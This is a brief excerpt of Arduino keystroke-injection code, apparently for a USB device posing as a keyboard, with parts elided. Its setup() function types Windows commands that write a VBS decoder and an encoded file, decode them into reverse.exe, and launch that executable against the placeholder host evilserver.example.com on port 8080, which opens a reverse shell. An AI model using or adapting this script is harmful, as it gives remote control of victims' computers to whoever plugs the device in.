...
void setup()
{
  ...
  Keyboard.print("copy con c:\\decoder.vbs");
  ...
  Keyboard.print("copy con c:\\reverse.txt");
  ...
  Keyboard.print("cscript c:\\decoder.vbs c:\\reverse.txt c:\\reverse.exe");

  typeKey(KEY_RETURN);

  Keyboard.print("c:\\reverse.exe evilserver.example.com 8080");
